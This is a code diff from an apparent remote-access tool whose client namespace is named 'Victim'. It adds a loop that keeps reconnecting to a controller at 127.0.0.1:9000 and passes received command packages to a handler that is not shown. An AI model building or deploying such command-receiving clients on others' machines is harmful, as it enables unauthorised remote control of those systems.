@@ -9,22 +9,50 @@ namespace LinkUs.Victim
 {
     class Program
     {
-        static readonly UTF8Encoding Encoding = new UTF8Encoding();
+        private static readonly UTF8Encoding Encoding = new UTF8Encoding();
+        private static readonly ManualResetEvent ManualResetEvent = new ManualResetEvent(false);
 
         static void Main(string[] args)
         {
-            var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            socket.Connect("127.0.0.1", 9000);
+            while (true) {
+                var connection = new SocketConnection();
+                if (TryConnectSocketToHost(connection)) {
+                    try {
+                        var packageTransmitter = new PackageTransmitter(connection);
+                        packageTransmitter.PackageReceived += (sender, package) => {
+                            ProcessCommand(packageTransmitter, package);
+                        };
+                        packageTransmitter.Closed += (sender, eventArgs) => {
+                            ManualResetEvent.Set();
+                        };
+                        ManualResetEvent.WaitOne();
+                        Thread.Sleep(1000);
+                    }
+                    catch (Exception ex) {
+                        Console.WriteLine(ex);
+                    }
+                }
+                else {
+                    Thread.Sleep(1000);
+                }
+            }
+        }
 
-            var connection = new SocketConnection(socket);
-            var packageTransmitter = new PackageTransmitter(connection);
-            packageTransmitter.PackageReceived += (sender, package) => {
-                ProcessCommand(packageTransmitter, package);
-            };
+        private static bool TryConnectSocketToHost(IConnection connection)
+        {
+            string host = "127.0.0.1";
+            int port = 9000;
 
-            Console.WriteLine("* Connected to client.");
-            while (Console.ReadLine() != "exit") { }
-            packageTransmitter.Close();
+            try {
+                Console.Write($"* Try to connect to host {host} on port {port} ... ");
+                connection.Connect(host, port);
+                Console.WriteLine("[SUCCESS]");
+                return true;
+            }
+            catch (SocketException) {
+                Console.WriteLine("[FAILED]");
+                return false;
+            }
         }
 
         private static void ProcessCommand(PackageTransmitter transmitter, Package package)
